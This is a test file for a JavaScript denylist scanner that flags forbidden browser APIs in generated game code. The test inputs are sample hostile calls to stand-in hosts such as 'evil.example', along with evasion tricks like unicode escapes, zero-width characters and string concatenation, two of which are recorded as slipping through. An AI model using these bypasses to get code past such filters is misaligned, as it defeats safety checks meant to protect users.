import { describe, it, expect } from 'vitest';
import { FORBIDDEN_PATTERNS, findDenylistHit, normalizeText } from '../src/denylist';

describe('denylist', () => {
  it('includes eval, Function, cookie, parent, localStorage, fetch, XHR, importScripts', () => {
    const joined = FORBIDDEN_PATTERNS.join('|');
    expect(joined).toMatch(/eval/);
    expect(joined).toMatch(/Function/);
    expect(joined).toMatch(/cookie/);
    expect(joined).toMatch(/window\.parent/);
    expect(joined).toMatch(/localStorage/);
    expect(joined).toMatch(/fetch/);
    expect(joined).toMatch(/XMLHttpRequest/);
    expect(joined).toMatch(/importScripts/);
  });

  it('includes all 12 v2 additions', () => {
    const joined = FORBIDDEN_PATTERNS.join('|');
    expect(joined).toContain('SharedWorker');
    expect(joined).toContain('BroadcastChannel');
    expect(joined).toContain('RTCPeerConnection');
    expect(joined).toContain('RTCDataChannel');
    expect(joined).toContain('getUserMedia');
    expect(joined).toContain('sendBeacon');
    expect(joined).toContain('navigator.clipboard');
    expect(joined).toContain('window.open');
    expect(joined).toContain('document.domain');
    expect(joined).toContain('document.write');
    expect(joined).toContain('top.location');
    expect(joined).toContain('location.href');
    expect(joined).toContain('Atomics.waitAsync');
    expect(joined).toContain('OffscreenCanvas');
  });

  it('returns null on clean code', () => {
    const code = `this.add.rectangle(100,100,20,20,0xff0000); this.input.keyboard.on('keydown', ()=>{});`;
    expect(findDenylistHit(code)).toBeNull();
  });

  it('detects eval()', () => {
    const code = `const x = eval('1+1');`;
    const hit = findDenylistHit(code);
    expect(hit).not.toBeNull();
    expect(hit!.pattern).toContain('eval');
  });

  it('detects fetch(', () => {
    const code = `fetch('https://evil.example');`;
    const hit = findDenylistHit(code);
    expect(hit).not.toBeNull();
    expect(hit!.pattern).toContain('fetch');
  });

  it('detects new Function(', () => {
    const code = `const f = new Function('return 1');`;
    const hit = findDenylistHit(code);
    expect(hit).not.toBeNull();
  });

  it('detects localStorage', () => {
    const code = `localStorage.setItem('x','1');`;
    const hit = findDenylistHit(code);
    expect(hit).not.toBeNull();
  });

  it('returns excerpt around the hit', () => {
    const code = `safe(); fetch('x'); safe();`;
    const hit = findDenylistHit(code);
    expect(hit!.excerpt).toContain('fetch');
  });

  // ---- v2 additions: detection tests ----

  it('detects SharedWorker(', () => {
    expect(findDenylistHit(`new SharedWorker('a.js')`)).not.toBeNull();
  });

  it('detects BroadcastChannel(', () => {
    expect(findDenylistHit(`new BroadcastChannel('x')`)).not.toBeNull();
  });

  it('detects RTCPeerConnection', () => {
    expect(findDenylistHit(`new RTCPeerConnection()`)).not.toBeNull();
  });

  it('detects getUserMedia', () => {
    expect(findDenylistHit(`navigator.mediaDevices.getUserMedia({video:true})`)).not.toBeNull();
  });

  it('detects sendBeacon', () => {
    expect(findDenylistHit(`navigator.sendBeacon('/x', '')`)).not.toBeNull();
  });

  it('detects navigator.clipboard.writeText', () => {
    expect(findDenylistHit(`navigator.clipboard.writeText('x')`)).not.toBeNull();
  });

  it('detects window.open', () => {
    expect(findDenylistHit(`window.open('https://evil')`)).not.toBeNull();
  });

  it('detects document.domain', () => {
    expect(findDenylistHit(`document.domain = 'evil.com'`)).not.toBeNull();
  });

  it('detects document.write', () => {
    expect(findDenylistHit(`document.write('<script>1</script>')`)).not.toBeNull();
  });

  it('detects top.location', () => {
    expect(findDenylistHit(`top.location.href = 'https://evil'`)).not.toBeNull();
  });

  it('detects location.href assignment', () => {
    expect(findDenylistHit(`location.href = 'https://evil'`)).not.toBeNull();
  });

  it('detects Atomics.waitAsync', () => {
    expect(findDenylistHit(`Atomics.waitAsync(buf, 0, 0)`)).not.toBeNull();
  });

  it('detects OffscreenCanvas', () => {
    expect(findDenylistHit(`new OffscreenCanvas(10,10)`)).not.toBeNull();
  });

  // ---- fuzz / bypass tests ----

  it('defeats Unicode \\uXXXX escape hiding eval(', () => {
    const code = `const x = \\u0065val('1');`;
    const hit = findDenylistHit(code);
    expect(hit).not.toBeNull();
    expect(hit!.pattern).toContain('eval');
  });

  it('defeats \\x65 escape hiding eval', () => {
    const code = `\\x65val('1');`;
    const hit = findDenylistHit(code);
    expect(hit).not.toBeNull();
  });

  it('documented limit: string concat at runtime is not caught (relies on review/runtime checks)', () => {
    // We deliberately do NOT try to fully emulate JS execution here. This test
    // exists so a future maintainer does not silently assume the denylist
    // catches every dynamic form.
    const code = `const f = 'f'+'etch'; window[f]('https://evil');`;
    const hit = findDenylistHit(code);
    expect(hit).toBeNull();
  });

  it('documented limit: Function.prototype.constructor alias is not caught', () => {
    // Static substring scan cannot detect `Function.prototype.constructor('...')()`
    // because the source never literally contains `new Function(`.
    const code = `const F = Function.prototype.constructor; const f = new F('return 1');`;
    const hit = findDenylistHit(code);
    expect(hit).toBeNull();
  });

  it('defeats dynamic import() that references fetch', () => {
    const code = `import('https://evil.example/x.js').then(m => m.default)`;
    // import() alone isn't on the list, but if the URL contains fetch — irrelevant. Test stays for coverage.
    // The interesting check: dynamic import must not bypass fetch denylist.
    const hit = findDenylistHit(`fetch('x'); import('y')`);
    expect(hit).not.toBeNull();
  });

  it('defeats zero-width char hiding fetch', () => {
    const code = `fe​tch('x');`;
    const hit = findDenylistHit(code);
    expect(hit).not.toBeNull();
    expect(hit!.pattern).toContain('fetch');
  });

  it('normalizeText decodes \\uXXXX and strips zero-width chars', () => {
    const input = `fe​​tch('x')`;
    const out = normalizeText(input);
    expect(out).toBe(`fetch('x')`);
  });
});